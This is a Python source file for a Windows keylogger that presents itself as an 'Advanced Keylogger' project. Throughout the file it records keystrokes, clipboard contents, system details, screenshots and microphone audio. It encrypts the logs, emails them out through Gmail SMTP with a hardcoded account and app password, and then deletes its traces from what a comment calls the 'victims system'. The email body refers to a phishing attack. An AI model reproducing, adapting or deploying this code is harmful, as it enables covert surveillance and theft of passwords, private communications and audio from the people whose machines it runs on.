
# Librarires for email sending purpose

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard
from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab


key_info = "keylog.txt"
com_info = 'computer_info.txt'
clip_info = 'clipboard_info.txt'
mic_info = "microphone.wav"
screenshot_info = "screenshot.png"

key_info_e = "e_keylog.txt"
com_info_e = 'e_computer_info.txt'
clip_info_e = 'e_clipboard_info.txt'

file_path = "D:\\my stuff mini\\Codes\\Advanced Keylogger\\Project"
extend = "\\"
file_merge = file_path + extend


microphone_time = 15
time_iteration = 15



email_add  = "coolrandomshit101@gmail.com"
password = "mztoprfjxpqeopix"
toaddr = "coolrandomshit101@gmail.com"

key = '_YGuvGMyXy44cTykgbdJ4zcRgSA0f7n1VtjyKkpxEQo=='

# Declaring all the required funions used in out keylogger here
def send_email(filename, attachment, toaddr):

    from_add = email_add

    msg = MIMEMultipart()
    msg['From'] = from_add
    msg["To"] = toaddr
    msg["subject"] = "Log file"
    body = "this is the body of the mail \n A convincing phising attack"
    msg.attach(MIMEText(body,'plain'))

    filename = filename
    attachment = open (attachment, 'rb')

    p = MIMEBase('application','octet-stream')
    p.set_payload(attachment.read())

    encoders.encode_base64(p)

    p.add_header('content-Disposition','attachment: Filename %s'% filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com',587)
    s.starttls()
    s.login(from_add,password)

    text = msg.as_string()

    s.sendmail(from_add,toaddr,text)
    s.quit()
# send_email(key_info,file_path + extend + key_info, toaddr)

def computer_information():
    with open(file_path + extend + com_info, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org/").text
            f.write("Public IP address: " + public_ip)
        except:
            f.write("could not fetch Public IP address (most likely a max query")

        f.write("Processor Info: "+ (platform.processor()) + '\n')
        f.write("System Info: " + platform.system() + ' ' + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP: " + IPAddr + '\n')
#def computer_information()

def copy_clipboard():
    with open (file_path + extend + clip_info, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard data: \n" + pasted_data )
        except:
            f.write("Clipboard could not be copied")
#copy_clipboard()

def microphone():
    fs = 44100
    seconds = microphone_time

    my_recording = sd.rec(int(seconds * fs), samplerate=fs, channels=1)
    sd.wait()

    write(file_path+extend+mic_info, fs, my_recording)
# microphone()

def screenshot():
    im = ImageGrab.grab()
    im.save(file_path+extend+screenshot_info)

#-------------------------------------------------------------------
# declared all the functions above and now starting the while loop to start the parameters of keylogging
#-------------------------------------------------------------------

num_of_iteration = 0
num_of_iteration_end = 3
current_time= time.time()
stopping_time = current_time + time_iteration

while num_of_iteration < num_of_iteration_end:

    count = 0
    keys = []

    def on_press(key):
        global keys, count, current_time

        print (key)
        keys.append(key)
        count += 1
        current_time = time.time()

        if count>=1:
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        with open(file_path + extend + key_info, "a") as f:
            for key in keys:
                k = str(key).replace("'"," ")

                if k.find("space")>0:
                    f.write('\n')
                    # f.close()
                elif k.find("key") == -1:
                    f.write(k)
                    # f.close()


    def on_release(key):
        if key == Key.esc:
            return False
        if current_time > stopping_time:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if current_time> stopping_time:

        with open (file_path+extend+key_info, "w") as f:
            f.write("")

        screenshot()
        send_email(screenshot_info, file_path + extend + screenshot_info, toaddr)

        microphone()
        send_email(mic_info, file_path + extend + mic_info, toaddr)


        num_of_iteration += 1
        current_time = time.time()
        stopping_time= time.time() + time_iteration

files_to_encrypt = [file_merge + com_info, file_merge+key_info, file_merge+clip_info]
encrypted_file_names = [file_merge + com_info_e, file_merge+key_info_e, file_merge+clip_info_e]

count = 0

for encrypting_file in files_to_encrypt:
    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)

    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
    count += 1

time.sleep(120)


# Finally we clean us our mess which is recorded and stored in our victims system.
delete_files = [com_info, clip_info, key_info, screenshot_info, mic_info]

for file in delete_files:
    os.remove(file_merge + file)

